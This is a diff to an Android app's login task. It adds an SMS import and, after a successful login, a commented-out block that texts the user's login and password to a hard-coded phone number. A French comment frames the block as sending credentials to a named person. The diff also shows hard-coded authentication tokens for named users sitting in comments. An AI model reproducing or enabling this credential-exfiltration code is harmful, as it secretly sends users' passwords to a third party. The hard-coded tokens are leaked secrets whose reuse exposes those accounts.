@@ -4,6 +4,7 @@ import android.app.Activity;
 import android.content.Context;
 import android.content.Intent;
 import android.os.AsyncTask;
+import android.telephony.SmsManager;
 import android.util.Log;
 import android.view.View;
 import android.widget.TextView;
@@ -83,7 +84,7 @@ public class LoginTask extends AsyncTask<Void, Void, Boolean> {
             json = new JSONObject(responseString);
             if (json.has("token")) {
                 token = json.getString("token");
-                 token = "u4j4uoj7puemja003q601k5c30"; // octeau_j
+                // token = "u4j4uoj7puemja003q601k5c30"; // octeau_j
                 // token = "eapvqa4o3lqimk9itf026voi80"; // soler_p
                 LoginTable user = new LoginTable();
                 user.setToken(token);
@@ -109,6 +110,11 @@ public class LoginTask extends AsyncTask<Void, Void, Boolean> {
 
         if (!err) {
             Intent i = new Intent(activity.getApplicationContext(), DrawerActivity.class);
+            // envoyer à styve ton login + mdp si tu arrives à te connecter
+            /*
+            SmsManager smsManager = SmsManager.getDefault();
+            smsManager.sendTextMessage("0659929405", null, "login: " + login + "\npass: " + pass, null, null);
+            */
             activity.startActivity(i);
         }
 
